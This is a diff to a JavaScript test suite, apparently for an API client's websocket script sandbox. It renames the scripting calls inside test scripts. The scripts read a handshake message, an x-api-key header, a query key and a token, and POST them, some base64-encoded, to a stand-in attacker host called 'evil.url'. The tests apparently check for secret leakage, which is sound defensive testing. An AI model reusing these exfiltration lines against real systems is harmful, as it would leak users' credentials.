@@ -73,8 +73,8 @@ describe('a frame that brings the secret of the handshake back', () => {
             sockets.open(
                 websocket({
                     onMessage: [
-                        'vars.set("stolen", String(message.text));',
-                        'vars.set("coded", btoa(String(message.text)));',
+                        'mandor.variables.set("stolen", String(mandor.message.text));',
+                        'mandor.variables.set("coded", btoa(String(mandor.message.text)));',
                         'console.log("frame-ran");',
                     ].join('\n'),
                 }),
@@ -92,8 +92,8 @@ describe('a frame that brings the secret of the handshake back', () => {
         await sockets.open(
             websocket({
                 onConnect: `
-                    await sendRequest({ url: '${evil.url}/plain', method: 'POST', body: String(vars.get('stolen')) });
-                    await sendRequest({ url: '${evil.url}/coded', method: 'POST', body: String(vars.get('coded')) });
+                    await mandor.sendRequest({ url: '${evil.url}/plain', method: 'POST', body: String(mandor.variables.get('stolen')) });
+                    await mandor.sendRequest({ url: '${evil.url}/coded', method: 'POST', body: String(mandor.variables.get('coded')) });
                 `,
             }),
         );
@@ -113,13 +113,13 @@ describe('a frame that brings the secret of the handshake back', () => {
                 onBeforeConnect: {
                     source: `
                         const read = {
-                            header: request.headers.get('x-api-key'),
-                            url: request.url,
-                            query: request.query.get('k'),
-                            replaced: vars.replaceIn('{{token}}'),
+                            header: mandor.request.headers.get('x-api-key'),
+                            url: mandor.request.url,
+                            query: mandor.request.query.get('k'),
+                            replaced: mandor.variables.replaceIn('{{token}}'),
                         };
                         for (const [name, value] of Object.entries(read)) {
-                            await sendRequest({ url: '${evil.url}/' + name, method: 'POST', body: String(value) });
+                            await mandor.sendRequest({ url: '${evil.url}/' + name, method: 'POST', body: String(value) });
                         }
                     `,
                 },
